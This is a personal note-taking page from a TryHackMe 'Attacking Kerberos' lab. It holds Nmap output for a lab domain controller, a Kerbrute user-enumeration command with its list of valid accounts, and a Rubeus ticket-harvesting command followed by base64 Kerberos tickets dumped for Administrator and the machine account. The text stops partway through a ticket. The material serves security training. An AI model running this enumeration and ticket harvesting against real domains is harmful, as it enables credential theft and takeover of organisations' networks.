---
creation date: May 30th 2023
last modified date: May 30th 2023
aliases: []
tags: #🧩
---

Primary Categories: [[06 - TryHackMe]]
Search Tag: #🧩  

# [[THM - Attacking Kerberos]]  

## Initial/[[04 - Nmap|Nmap]]

### Output

```bash
Nmap scan report for 10.10.80.103
Host is up (0.094s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 68f28b17157c90d74e0f8ed14c6abe98 (RSA)
|   256 b03aa7c3882ec10bd7be1e431cf75b34 (ECDSA)
|_  256 03c0ee5832ae6acc8e1a7d8b20c8a2bb (ED25519)
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-31 00:35:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local
| Issuer: commonName=CONTROLLER-1.CONTROLLER.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-30T00:32:00
| Not valid after:  2023-11-29T00:32:00
| MD5:   c5a7f5db5d1c4114a44ef71fbf6cf56f
|_SHA-1: 3b2582046ae0873cd0f905a3985ea1df1d696aee
|_ssl-date: 2023-05-31T00:37:03+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CONTROLLER
|   NetBIOS_Domain_Name: CONTROLLER
|   NetBIOS_Computer_Name: CONTROLLER-1
|   DNS_Domain_Name: CONTROLLER.local
|   DNS_Computer_Name: CONTROLLER-1.CONTROLLER.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-05-31T00:36:56+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-31T00:36:57
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Initiating NSE at 20:37
Completed NSE at 20:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 242.06 seconds
           Raw packets sent: 66426 (2.923MB) | Rcvd: 65902 (2.636MB)
```

## Enumerating Users w/ [[03 - Kerbrute|Kerbrute]]
```bash
sudo /opt/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

### Output

```bash
  __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/30/23 - Ronnie Flathers @ropnop

2023/05/30 21:39:56 >  Using KDC(s):
2023/05/30 21:39:56 >  	CONTROLLER.local:88

2023/05/30 21:39:56 >  [+] VALID USERNAME:	 administrator@CONTROLLER.local
2023/05/30 21:39:56 >  [+] VALID USERNAME:	 admin2@CONTROLLER.local
2023/05/30 21:39:56 >  [+] VALID USERNAME:	 admin1@CONTROLLER.local
2023/05/30 21:39:57 >  [+] VALID USERNAME:	 httpservice@CONTROLLER.local
2023/05/30 21:39:57 >  [+] VALID USERNAME:	 machine1@CONTROLLER.local
2023/05/30 21:39:57 >  [+] VALID USERNAME:	 machine2@CONTROLLER.local
2023/05/30 21:39:57 >  [+] VALID USERNAME:	 user2@CONTROLLER.local
2023/05/30 21:39:57 >  [+] VALID USERNAME:	 sqlservice@CONTROLLER.local
2023/05/30 21:39:57 >  [+] VALID USERNAME:	 user1@CONTROLLER.local
2023/05/30 21:39:57 >  [+] VALID USERNAME:	 user3@CONTROLLER.local
2023/05/30 21:39:57 >  Done! Tested 100 usernames (10 valid) in 0.913 seconds
```


## Harvesting Tickets w/ Rubeus
```bash
Rubeus.exe harvest /interval:30
```

### Output

```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30 

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal)
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (5/31/2023 4:55:43 PM) 

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  5/31/2023 4:20:06 PM
  EndTime               :  6/1/2023 2:20:06 AM
  RenewTill             :  6/7/2023 4:20:06 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable 
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZ
r
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEnI1mPugKIXNtv/93vIMTkzf3rsxEpLjRe8
S
    KZ1HFy+KgGvsCZgHjuQl49r2e9EgkjS7ngWUaEEL2wKwOaZVuMfbIaWLhKUXNkmmFl8G2l9sUJRmsIlL/XjUj3YzvHxXevGa0e1
8
    pIhZrPDsoXWrQwyE2QTo1tTQi4hTR38K4gF0+40q6jV/pwA0EAJDVmb7VYUe3Vb90UCaNEYXjsc7mERSlbxS3hA/mObceSx56Rp
J
    ftuje+U2dmE77WrfP2ddtw+QdqjRG5JuPzoP24rQojDg0hwpDcHqoHOY5rpiQp/bUw/JGeOLiG7ouwvhpz8DEItp73qjmDQzhSd
d
    TIvc58/C7z5Su7506dFSRkHhIm56hT1aEDzCJ675mhS0a70lcw/tTww5tlSlLWI5i9oa5PzKAVglkC8OyaST9muOMOfWwcaTLik
e
    xoGKNbqs1k7MDDhdaXfEv3WM3ueVCga3YRcG5JbMVOLLK0pqc8ttGCtDMVP8Pz9KmUX8CFRI4k3G+UvLD4lnNTT8wwtHMOKF8Vg
R
    0DX7bRBPo0yMBfnHPMfSp9uWtzxJFskO3oU+VaJJoadi0M14Kip5sKihIdRct26HkF0gQxbT0zIKrRgHvhfQU5WvnNm7zeo37Qw
k
    2sism0hh06S996yDS6OZiy53qv91U0pD+r+TelyRa4wn8bb8WOIW/sOgkuuMjO22DCoS16X/C+MbH3BNiPQTqYZU6x5cVl+rBDv
M
    rs/iG/nF3hkRZAHk5BWMUsoH+fx+gYXfQf+ZA15qf1/i+KaOoCKlU0M8YPU3WBH/7otqt9rrq6WNoutu9rh44lgVfRXu+hikR4K
5
    mPTnY2+OuipYPV7VfEQ7W/yhN5li8XI4jV6rIhXVlbRgdQt8B09iK/pibfb/esQR6mZwQTx3jRBWZIf8gDsUZnO90T4yr56vRGE
K
    oa7ctjxmJ2HWV1RhH7H1XUlEHolbvI6bNqlptPpO1xC+spT/O1o2g4vFRdv3S58Lxwt1oSaPMfGGLbWrnStISvO43tQDMawoRv+
+
    YHG1OhRyOVyVDzyH9OShbCUuFynBFJt6ikq9mzjTBFH8nr6t7OS40SXqT0lJK/LFpTPR0grniRvw/22hJJ8D2AbaG7In/lRgGqN
t
    kOfNV9DUfPONYBIDsMCARt4CUtE94iYBOHoQtIKg2DFcx9u3Le1XqcVeQ5mAJwrjFDWGbBCPKi9ElaWsS+OtaSEM1zhEINqaTZ5
j
    kiOqVk+WfQ69jvRoJiSIVSF4/euE4MUz/9WWxnXwW3Euv2I5/iSIoJ4cdVGhehKMNydwq4tKwaWmZod9PLrYK71Os/Ef1r/FBDP
M
    Vw0N6AMu6leXCgzInvLYBGd1+xkHSNovi7xZ99zAq4gV1/uhDBucIaKjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qA
r
    MCmgAwIBEqEiBCBnJPIuXc0VzWkQTmFYMk7Fr3XifGHIw17qwassy/mhhqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoRE
w
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIzMDUzMTIzMjAwNlqmERgPMjAyMzA2MDEwOTIwMDZapxEYDzIwMjMwNjA
3
    MjMyMDA2WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  5/31/2023 4:37:23 PM
  EndTime               :  6/1/2023 2:37:23 AM
  RenewTill             :  6/7/2023 4:37:23 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZ
r
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGihKFAUNljS5XtRyIgiEJ9rRg5oa5t/6CYd
6
    DdusjSJmR8PEPECsAvmQnUfHmJsjv1sHmGyejxyZvULZLIKi5/rSd1l+MrAXBvVrFDNrl/eQ8f3xXn//Bz5y6aPjI5rXfUTjLsi
Q
    +cLzB1wA50q52kVLPIWN4w9RRKFCdze+E166Nr/4GhMn2TI5llQ4fxnkE4PJoUyBn/0m8NFYvlFmMjpjygi1RwSW1TJonBEn8ws
+
    SI2clA//1wTrJkOoE5b9N7S1+0OmJ9G/i7rN6K/bt2dg9F2XL9F7MQKfcksFAHop7oYVH1pjctmnyTWCsOcNR1Ia4/jkVM3vjzL
g
    e7PCkpYCsMPpkzfwiBn2aWXhO4OYuJnIbYqKHUJubSlELXcin2SyQlEpeXyIyeZwsddZo53bK87EN1uKDIxFLNFNmW4b+T4It3m
H
    VnRMOyZed0wmcW8QFDFENvDRrppOmkBtqoxd0c//cVk/GASFI/ITHdKs/MUFk/S7hWVeEsJopBLoVN+f2rgJRh0PK02Po/kcM+9
n
    RTQwPu/wcNbAk67vuSm3/JqbNQEUmhZx62ZPIXEshRSQljIKKZx5PwGUDX1XZpmNi7HeJQVyaDwS9rGFEWGXlNb9W9yYJ2pafK8
C
    I4cEgJjibFoXy7fjAN5MqRVvf5vUZKcfVkvpkj0IHzyB8uZ2kU8agooNA3NkmmOhQQmj3dGwC9yn5qAB8cOy2KIZrBWqi3sd6Is
B
    g46F2bSdDAsN5W8mOpQKqr8JiF1ffIr19dEyGkJWnenbnphyX/akz1uNCJfTrMOetC4kzxMyKBafg3JsURcjXjrMOFeDF8ejumM
a
    zs6zTtFFtFl+s41jK2Rh9XZNEfIWqbDboOV74Kfm1eMjfDmAbH9UVXiR21NrqO5UKAUuadrbevziVxcXGW71nZdBzFi3kCq8zHh
F
    YpqnjDJZ7IzTYGufn0KYltlyf8wUxhA+vDbq+XX1/bCk2mJSGI4Ldekd7a19vOivQHxZ+kCPJSN94VccQxU5bYiGNl9nmJtOJOP
x
    7u1al9cvUJG9mghJKHjwAFrP1TZBy8FgNgusLCXM4X7dmibuvy/RUx8v4wQakQzjuSL57hyBhcKkMTFsN4I//L4ymcN6uQASsRt
X
    BQato1gWOG0TfN5eE0oaBHZCOPX1FdyP29+b+eSDN6zvySAF/hYboyHRxPxSTSDYdeVQd0K9iGqvByzQQiOJC6O+shG72wSbQrN
Y
    a7K1Y7oW1QD7JGqb3Iz++6kmjFtJ7/PZC9VQq7A/e2Ky7oe+1H1scO/iVTkK43dw3dE9IDoOLeeuDleevnabCmP2H4tFZ/m9VAu
A
    xhNIViCV/K2uqC1GFiDsSBDWj/UB9tTkjSdqVcPEg8akHPt+PFkDtCVTzDkbFcHKk6OB9zCB9KADAgEAooHsBIHpfYHmMIHjoIH
g
    MIHdMIHaoCswKaADAgESoSIEIIVvXw01JvtIRkx7bUq6HHD3hZiU6G/iv/lbh3NNx2POoRIbEENPTlRST0xMRVIuTE9DQUyiGjA
Y
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjMwNTMxMjMzNzIzWqYRGA8yMDIzMDYwMTA5MzcyM1qnERg
P
    MjAyMzA2MDcyMzM3MjNaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw
=

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  5/31/2023 4:54:04 PM
  EndTime               :  6/1/2023 2:54:04 AM
  RenewTill             :  6/7/2023 4:54:04 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZ
r
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGkzifIH+LTHgl2imMqnOmno6XAQ2xb4XuKm
b
    asYyLK58xLvJPCrsQEaRUQ5aTuUNSH1VBYw3fagLkW0uF+JFPMPWYoh3+pOKA1jGP+L+e/P3UHMk4om+qLxYl7W/QkHerbgINjT
p
    1gPATuY49K27eASpALYGkPOgy5F4sF8uRpOLGbR3/H6Kr2vHLid6OhcdRDJzd5q+sh+RnMV3Jt5kdYcCykyncNeutCcFhEsjBD0
u
    or+q6Ls2pioQImpX8TYLsmJRD+LoRtItMhCQVp52cVb7q6hiTQ1KupGgmSyUXldrOVR+b3AodzY+a3zQYzty7pASf3DGXF7hb78
9
    v7L4v/o94IRgkX6uh3AedIGd463b8lNDz0/DxkBtEWBiNLhvfc6F8h6pcmFYbIPfh4XXbpe3bi7phCTuapwrV52IriuZuhyWAWG
R
    FUGpymiy0qvo//jg9FiwKD0idLBQzadbmAVUcmX0HaEtzK/p66ti8WQv5lO/H1AX1hkFLSjiLVkoo0LaSZgNep1wjSb4Ua2Oqgn
F
    OtaY5OymlrXwkS7HA3/0eaaTUbFL3xsOaYv28jkT0/U8wI2hmwm4x3H4MRLhpxPPuhBAX2YSZxqy8rP1ZGTU7u2hALw0RXOu7TX
J
    KuynkFmva0SSs29AVNsGTH9gzZVsQha/FEcnehPYYRL0II8NjC7dE+CUdKYxLJkNVN9y3IImhJrtvxORVWkLZIb0ysKjDn5u7U5
c
    tgGusBQuJ+PNs5mA0e2csm9K0HisHYd8p2UgWJLWmQv+Hkt5PE5pqTwd2uL12zTDQQI876PHcwnQMlFCoRmT2D4khs2feDAOJER
4
    AhqimTWjempvDGH/QocnkSUTEPbsoo+HnyrzlmG09r9eZFNXqValHaI/DqfafXN40wOtU8vnqurLRbamcuDbOevbNfaDircxYM7
M
    Z5CY201+2dQYFalWkn91fRVT5TmUzjTFXRFQBerR/rwiv9J8vLNnsxm72OutAY/ZSjkDaD4HcXCx9/aNm1TnCPBS1QnObJGp9Oa
7
    9UbihoIBsBZuX/Gd/wTi32Out8DbztY2hDFKCZQhOLKUUk29tDlexiSEuR55Y4SEip1F3+AZfGeGJTrseEXMDSDP7rNiOL3ZPNO
x
    u5studyZ10hPhac3wvXao1VAVit4zXu6z0tA04p2IZu5YQIAAjjdvp3JPJGSGOZHzcjwLN2dGnGSW39kdjqMRUmZ2RX0DNn4A4l
e
    cT9mPjgK2vRrIfGYmYMj/2ZVUp/RmhSMkeLicHm06HO4wmFjA4m0HLrXE0FSl5B1XwfJwSHyFoh0fCWS5cSw5Fm1Z2uCZ9Zygyj
Z
    QNPcte6KnKn8K4WsP+uUGxxIMuUX/uEma/zxmfKlclCJ6G63pP76T2HA+xgNQAINBaOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIH
g
    MIHdMIHaoCswKaADAgESoSIEIAr+br3IuA8HB1jr/bCuwEVpuLdBQnr1syj4MfViqA2poRIbEENPTlRST0xMRVIuTE9DQUyiGjA
Y
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjMwNTMxMjM1NDA0WqYRGA8yMDIzMDYwMTA5NTQwNFqnERg
P
    MjAyMzA2MDcyMzU0MDRaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw
=

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  5/31/2023 4:49:32 PM
  EndTime               :  6/1/2023 2:49:32 AM
  RenewTill             :  6/7/2023 4:49:32 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZ
r
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEmyu9C+u9ZMExqaMiWHUt2era+0v4B0UeuP
l
    ELRb4ewrbc/EwDS1KAfBkRa+UQlSqON9rf1YE36GjKxTO6puJDM7IJ3zMsYGGEdLHwboGojOGsl+XNBa1TC/i/oiG4iZBbkpStY
1
    63tfGzp9dwvc0B5bZVyCMDXateHGAYm9CSSvhJLdr4bFCFASITWoZuWTkQp68eabIno9MIuqMvOr6JkBOHDEvMnWzA/q4w9a+NL
Q
    qHA08jJatLXnVRGIpoLyoLTY9MISviIOc48p0NjV1SHrc5unzEriYK6kg7hGViHgEI6Ze8HsaFQMyojK1zrwr74A24K6pO9BcUx
Y
    bDKJRbqACzD5QxCnKLGAbWukJZkuV6BN67lqnpUoOq6Xuh6SK/1fNjANsxMQX+nxDQ6DAXiKQ7bj3zyehMMjEXpBAk/wZFSFblv
e
    iQXA1kKMy+uXa0jjTzP8PEbz5mApcVPy7ZzAJAmZYipSnkQTfQ5MOVA7iidH98yooFeH4F5ZX+q9kPXY1D9sa2vWZ4Mm92wFvh9
G
    2OJ4eDd/7pgtxQzho/E1ztG7ksi9oACNl8bxDQlS+tmPeVMebW6D7S9D0GNhs2zZI7hCoiYwaND4So77brla6ZeRFJbvaKYTla1
a
    OxeTAZjaL7WOHQVDjIYD/R3b3a0KNXbNnYldkS4G7PRR2e8lmCXb39cUhPz0op4aqtp9pnaWvOiI6x6XW7+XRP3JaOs1vgSgf4l
g
    ZLdTuVvi2R1GOqrWOfD0UOI1nCH7s/bkAgnftH4J9bXxqKC2RT4NbTmLaqR4Y2nKtC0JDg7w5upsks7xjmFNA84hshud726gfVY
h
    pvudL1BC2Gu9yl+FaZXW/PhusvIhcV5g6JZSelmnHMMQdedmdmgJbHjx/PhK0VGL6pdp+V3YueXKPWKKsIUePG2Ml0StQDofeH4
w
    86Nkw3SQ87JWoKiZA4JwHU6bfVpGqiWAN75lS8JJX2QjEWrOkNQw4OUVCr/6W3kFh2mH9soRM7t8pAx3TkCSlCXYrfoe+8Yslk0
Z
    EpqsGKVdQof3RVzN5DHLFhtBYfJ9BjZRpfs7HrToM9Ta4r/ZPt8yv6QwkQ9jK79v108n6yPWS53ua2Zw+KkKv6sdfuz60EHb+N7
Z
    JIVNZnWC5x4sxET/OXDT/uqJtSZrDO9eE3njNntbzdCIAJWidCIyQjlGkiKLrU9MwN2vQwkzK1w7WmR5jGUE08xAIevoZwX+kmF
k
    9bbnVcg1Nqq69P42Ik8kDJfIGDyfsXgroQtkkvVJMweaw/UKixNIH0P24zlXgkB5AgoWzQ7dRrSL84mErhMfWcOevrihxAe8hXB
r
    FjxVQ3mIB/YUDA2tPlmYbGe2aCyh4BJOjS3VW0HVVaMutQZfvrLtLrOjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qA
r
    MCmgAwIBEqEiBCDQtF2Z1XqElEBd1L6AFCeaSjRSZUwLb3GHvTmU0lzGTKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoRE
w
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIzMDUzMTIzNDkzMlqmERgPMjAyMzA2MDEwOTQ5MzJapxEYDzIwMjMwNjA
3
    MjM0OTMyWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  5/31/2023 4:20:06 PM
  EndTime               :  6/1/2023 2:20:06 AM
  RenewTill             :  6/7/2023 4:20:06 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZ
r
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEsylFSyY9EsysQpo/c09OyonNvmYgRvvwXY
E
    K8KPFm0U8ku1rnTHiCO9Y8Bd8/rSgWwOa3+pqQSobx/EekCnimwVehi+f6ucwbZT30m5qGPo3fUrzjhdYanhWT8R0n2aoxBbZY9
J
    8apiJipRpZA7nl14+FBNxz7jX/PGZDQSm5Av0DMuS1gx9c0bzPVK+EF4hP7+4PS9AfJsbX+eNnWLfzLbZS/Ve5CkfRbMipbW28S
v
    k4FJCTpP/UvrdgKumpr6cYgXCnAHeW8m+UqhNaTEPRCShWOKzQfJgdP4f/34nk6HCrFpm6wMXXcTQG6y5BVIuQHNm5ZKHJ4DniC
A
    Od4lgSDtV6HeJiAhPXXLZGNTTn8DjA7mCEbqhXqUICM9HpBi17utOjZkZc8N21lzOnDl3K5L9OVJY5g5JtnHiSGFnDPULCM05dX
l
    QB/kAcmYtOAJndbGyEm2uvSwGchdDLHC+OU+xoK4bRfqGZ/XEs8Z7x+51OEeAMvgiDvUHLMSArifkkvR45LqDLOXlWO6FCobL8L
V
    3x5qn/wbkSp57pPYmIsYjCLiYvDtAt6Pz7MpRsyIGshYIpxTWZFM44x+LGFi1+ZwcqpUXppGlYZeY+vvY1KsSjWParHm/RxZtM3
5
    5LgnlEtIG/6uSRpPcVgTnSZcsW6kTvNIesPD/Ol3mie8nRtN6DMrLCI47z+lsESDPIEUdxkReTrlZymT5iOKXVfQyWreAccGJBD
G
    gnPWosIpmZbfy4UC8JfrF1srTfwslSdqOKm3NPx0EUENW5nbuNMV2TlNaTDOnQop9ZIRRDpkwz/ItRA2Pi+4Hj6D31dUQYzn2fW
8
    d9zXh9eJLQ4EItlfR2F/Pada1kcniZsqMlVgyiYeMUS2zov+tdL1NtUA5MZSeicqMQcKvKH6HagHl8gPl2T/gXGHjnuijIrwCZv
X
    TksdcUvBBA7C4NHrlgH9rYz8ov1WkSdNnZqQbfaHplZNmAow9jIUS8jKv9Amt/DYELdq5Grkeqr+Pb0sPvsYOsTvnGNfjC0eXx1
z
    A8NrOZA79qN0SEAP802eO8d8vAmHVQob32xjke2G5a9ZJA78f2TqeWQJln0XVNPYtgOhWlTJLOAL0BMCuQ/sYfCIx0Rjde/i3/v
h
    3/z35f7jAPrII3p+IogMICFdRC1ClhpqRd7QC9EIJb3WoqBKyxPIfCh9DRt1V6R87pUYxk4xDXM41Me7z5NvG+ZjzP73R1DxDUe
a
    snr0fy/C8pSUu2u9C44XJpHwoBTo0zBqpWFmYTrYcXBgaZWLjQ5jzzc54QAaRVWrp2ESO2jPexntg8IVeomjrWPJsFBDC3XBISY
g
    9pJ8jaRJvTB+G2SfOmc92mxYOj0NiI0DZ1xEItRG3M9+MDbYfeFy8fajgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qA
r
    MCmgAwIBEqEiBCCwhNXxKE2Mf2RUImivMalYgpAEftfttCk/pGyStFCToKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoRE
w
    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIzMDUzMTIzMjAwNlqmERgPMjAyMzA2MDEwOTIwMDZapxEYDzIwMjMwNjA
3
    MjMyMDA2WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  5/31/2023 4:31:37 PM
  EndTime               :  6/1/2023 2:31:37 AM
  RenewTill             :  6/7/2023 4:31:37 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZ
r
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGjRQLSc44jVrqkTpccc/b1pe4VehPoEgkca
s
    PBgs4D1/087oW4Sgn12RDeAuN9LMTvP/wMGeEJ74z6EPYvogv9KjjSf8f8W23BB3IRF9+86i2FHzuuCp45LgRwnTXuMzmuTUkFU
y
    WknrZy1S2LHZ4UjpW+PYCDF87hrlX0I98Ou1shDWNojBDAfrVZWBvUqY8xhRf9hqz1vOp0wcXMfGoF+VOQ6a5rmk+PXuxctwiHx
H
    6Kyh+Kxop+FTVZUVQtkdY+faIvqgAu0rTk6QgpJS4y2Ij08wix8iBkzWKPBCGtZ2GxG2gu6ORsYvvVnzn92mEoL3CZ9i8XGfdad
k
    BBl5tZG1mWnhnDUvw8TuaWeC+bOriEFsnsJcpZ6pMqE0acqnMPN9AMs/pZiDTy2J6absRxzwx6Gab04d+cmrDHzLwzWtdaFT35x
0
    8M14RA8/tiSF+YMwpM0x0ZaeCRS66/Zxq0nowapPbxsp6Fs0t4aE68PUwjV+uQa3+eURrJEY5Dlbow571M5zyQGlr7mDxYKRuI8
E
    SS8vAcYWYUKrV3PL+q8M9r12Q8or+ndMzkghv6jv+8A6vSZK8UTI2cMXqcwf9Fh75AB7d2XULTPxrIvaWaYh5w8nRHK2ixQ6YwN
5
    epBevxQyRxHVm4N3UlAtMxYSI33EMPmKKJ/C38xIG8QbtyLki8jkTsD4fhHDZKgx+1r3orx13Pns1L5dWM2ZbhNxWgY0e2fB+f0
w
    DLvhDiAKAoKkT0Kn2pKKYrDBHPkfF3Ru4OQ1U8RpC7ux71DavvMXjpzKkb4ytkd42bxUTGkZPNC5vUnHhm7joBL875QfZNejYq+
I
    U/XifRukYyIly1CqI7liwthDAvex0hivXkRlzBvYzu/taspaawz2jRUigQAW/rVeptaTGs/x3/C8h19WOHxUVZQtJ3FH9WJd4uR
8
    I3fHXg9hAztcz9YAAStLqCnYdqUjRikNyrGfBMTvigr0tzy99RI/ZOy6G6YoOYyyBUrSxQiZPdCNBNyWD4VtsTgGUEq1AsqYTV7
J
    zf4eTuUrOdp9QcWHeeCuNcPebBMm2EeK9qWPZ2ikUGtibBPzNzmRJ0g8sQiTRjfBCIUnBBWccIU0xhMtCVEjtY4dXk4mnDReoTR
d
    QNc+DK84MeoQLXgktJ9JmWWaRFoW8g8zpbI3QFv/mNuDnfGvnd4TyKBU11FzCbCrgreZpIdNNvQf8CXoimEKqQLzBu0MrnWnGxZ
y
    Oa30mc9GQS9DaVu7lgARq2dr6z2jZcPXt0irA1+GkwTz+4C975t+ddVgyDPM5aVSA3HDJmy79zwxGAww6TyicysseL0dYnX/r6j
L
    F6XLTSNTqpqIDcoz4FC6j9bZM407BhhHvVyk2Cbqitd8PJNAI/f//T+6+tOVFri5kqOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIH
g
    MIHdMIHaoCswKaADAgESoSIEIGSferFyXSdrK//YpkgBDTTUSA3MGwLgndvxdbR+2Fv/oRIbEENPTlRST0xMRVIuTE9DQUyiGjA
Y
